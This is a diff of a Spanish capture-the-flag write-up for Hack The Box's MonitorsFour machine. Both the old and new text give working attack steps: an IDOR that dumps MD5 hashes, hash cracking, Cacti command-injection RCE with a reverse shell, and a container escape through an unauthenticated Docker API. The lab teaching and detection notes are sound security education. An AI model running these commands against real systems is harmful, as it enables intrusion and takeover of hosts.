@@ -1,11 +1,11 @@
 ---
 machine: MonitorsFour
 os: Windows
-difficulty: Insane
+difficulty: Easy
 platform: Hack The Box
 category: Machines
 state: Retired
-tags: [windows, cacti, type-juggling, cve, docker-api, container-escape]
+tags: [windows, idor, md5, cacti, cve-2025-24367, docker-api, cve-2025-9074]
 ---
 
 # MonitorsFour — Hack The Box
@@ -17,72 +17,81 @@ tags: [windows, cacti, type-juggling, cve, docker-api, container-escape]
 
 ## TL;DR
 
-Cuarta entrega de la saga Monitors. **Cacti** con una comparación débil en la autenticación (type juggling de PHP) y una cadena de CVE que acaba en ejecución remota dentro del contenedor. El contenedor tiene la **API de Docker** accesible en la pasarela, así que se lanza un contenedor privilegiado con la raíz del host montada y se lee el sistema de ficheros de Windows desde dentro.
+Host Windows con **Docker Desktop + WSL2**. La web en `monitorsfour.htb` tiene un **IDOR** en la API (`token=0`) que vuelca la tabla de usuarios con hashes **MD5** sin sal: se crackea el del admin y se entra en un **Cacti 1.2.28** oculto en `cacti.monitorsfour.htb`. **CVE-2025-24367** da RCE autenticada y shell como `www-data` dentro del contenedor. Desde ahí, la **API de Docker sin autenticación** en la red interna de WSL2 permite lanzar un contenedor con el disco del host montado (**CVE-2025-9074**) y leer la flag de root.
 
 ## Reconocimiento
 
 ```bash
-nmap -p- --min-rate 10000 -sV -sC monitorsfour.htb
+nmap -p- --min-rate 5000 -sV -sC <IP> -oN nmap.txt
 ```
 
 ```text
-80/tcp    http    Cacti
-443/tcp   https   Cacti
-2375/tcp  docker  API de Docker (según posición de red)
+80/tcp    http   nginx (redirige a monitorsfour.htb)
+5985/tcp  http   WinRM
 ```
+
+Solo dos puertos: nginx en un Windows delata contenedores. El HTML filtra el formato de correo (`sales@monitorsfour.htb`) y hay un `/login` que no acepta credenciales por defecto.
 
 ```bash
-whatweb http://monitorsfour.htb
-curl -s http://monitorsfour.htb/cacti/include/global.php | head
+echo "<IP> monitorsfour.htb cacti.monitorsfour.htb" | sudo tee -a /etc/hosts
+ffuf -u http://<IP>/ -H "Host: FUZZ.monitorsfour.htb" -w <wordlist> -fs <tamaño_base>
 ```
-
-La versión de Cacti se confirma en `/cacti/include/global.php` o en el pie del login.
-
-## Type juggling en la autenticación
-
-Cacti compara tokens con `==`. En PHP, dos cadenas que empiezan por `0e` y siguen con dígitos se interpretan como `0` en notación científica, así que `"0e123" == "0e999"` es cierto:
 
 ```text
-md5("240610708") = 0e462097431906509019562988736854
+cacti   [Status: 200]
 ```
 
-Enviar un usuario/token cuyo hash MD5 empiece por `0e` y solo tenga dígitos satisface la comprobación y deja la sesión como válida. Es un fallo de lógica, no un bypass de contraseña: lo que se salta es la comparación posterior del token de sesión.
-
-## RCE en Cacti
-
-Con sesión válida se abusa de la inyección de comandos del sondeo (`remote_agent.php`, `poller_id`/`host_id`), la cadena clásica de Cacti:
+## IDOR y crackeo
 
 ```bash
-curl -s "http://monitorsfour.htb/cacti/remote_agent.php?action=polldata&local_data_ids[]=1&host_id=1&poller_id=;id;"
+curl -s "http://monitorsfour.htb/api/v1/user?token=0"
 ```
 
-El comando se ejecuta como el usuario del servicio web dentro del contenedor. Para trabajar cómodo se lanza una reverse shell y se estabiliza con `script`.
-
-## Del contenedor al host
+Devuelve todos los usuarios con `password` en MD5 sin sal. Con `hashcat -m 0` y `rockyou.txt` cae la del administrador (`marcus`). Esa contraseña entra en el panel de Cacti, aunque el usuario sea el nombre de pila y no `admin`.
 
 ```bash
-cat /proc/1/cgroup          # confirma que estamos en un contenedor
-ip route                    # pasarela hacia el host
-curl -s http://172.17.0.1:2375/version
+hashcat -m 0 hashes.txt rockyou.txt
 ```
 
-Si la API responde sin TLS ni autenticación, se crea un contenedor privilegiado con `/` del host montado:
+## Cacti 1.2.28: CVE-2025-24367
+
+Con sesión válida en `http://cacti.monitorsfour.htb/cacti/`, la CVE-2025-24367 permite inyectar comandos a través de una plantilla de gráficas. El PoC del propio autor de la máquina necesita credenciales válidas y credenciales de la base de datos (se sacan de la configuración del panel):
 
 ```bash
-curl -s -X POST http://172.17.0.1:2375/containers/create?name=pwn \
+python3 exploit.py -url http://cacti.monitorsfour.htb -u marcus -p '<password>' -i <IP_ATACANTE> -l 1337
+```
+
+```text
+www-data@821fbd6a43fa:~/html/cacti$
+```
+
+La shell está **dentro de un contenedor**; `/proc/1/cgroup` y la ausencia de usuarios de Windows lo confirman. Flag de usuario en el contenedor o en el host accesible.
+
+## Escape por la API de Docker
+
+El contenedor está en la red de WSL2 y la **API de Docker escucha sin TLS ni auth** en la puerta de enlace:
+
+```bash
+./chisel client <IP_ATACANTE>:9999 R:2375:192.168.65.7:2375
+curl -s http://127.0.0.1:2375/version
+```
+
+Con la API accesible se crea un contenedor privilegiado con el disco de Windows montado (CVE-2025-9074):
+
+```bash
+curl -s -X POST http://127.0.0.1:2375/containers/create?name=pwn \
   -H 'Content-Type: application/json' \
-  -d '{"Image":"alpine","Cmd":["/bin/sh","-c","chroot /host /bin/sh"],
-       "HostConfig":{"Binds":["/:/host"],"Privileged":true},
-       "AttachStdin":true,"AttachStdout":true,"AttachStderr":true,"Tty":true,"OpenStdin":true}'
-curl -s -X POST http://172.17.0.1:2375/containers/pwn/start
-curl -s -X POST 'http://172.17.0.1:2375/containers/pwn/attach?stream=1&stdout=1&stderr=1&stdin=1'
+  -d '{"Image":"alpine","Cmd":["/bin/sh","-c","chroot /host_root /bin/sh"],
+       "HostConfig":{"Binds":["/:/host_root"],"Privileged":true}}'
+curl -s -X POST http://127.0.0.1:2375/containers/pwn/start
+curl -s -X POST 'http://127.0.0.1:2375/containers/pwn/attach?stream=1&stdout=1&stderr=1&stdin=1'
 ```
 
-Dentro, `/host` es el disco del servidor: `C:\Users\Administrator\Desktop\` y `C:\Users\<usuario>\Desktop\` quedan legibles, y con `chntpw`/`secretsdump` sobre `/host/Windows/System32/config` se obtienen los hashes locales.
+Dentro, `/host_root/Users/Administrator/Desktop/root.txt` es la flag de root.
 
 ## Lecciones
 
-- Comparar tokens con `==` en PHP convierte una comprobación de sesión en un bypass trivial; hay que usar `hash_equals`.
-- Una herramienta de monitorización con CVE de inyección de comandos es ejecución remota directa si está expuesta.
-- Montar `docker.sock` o publicar la API 2375 es entregar el host: el contenedor deja de ser frontera de seguridad.
-- Detección: peticiones a `remote_agent.php` con `poller_id` sospechoso, procesos `sh` hijos del servidor web y creación de contenedores desde una IP de aplicación.
+- Un IDOR con `token=0` sobre una API que devuelve hashes MD5 es una brecha completa: MD5 sin sal no es almacenamiento de contraseñas.
+- Reutilizar la contraseña del portal en la herramienta de monitorización convierte el acceso web en RCE por CVE.
+- Docker Desktop con la API en la red de WSL2 sin auth es el host entero: el contenedor no es frontera.
+- Detección: peticiones a `/api/v1/user` con tokens triviales, creación de contenedores desde una IP de aplicación y montajes de `/` en `HostConfig`.
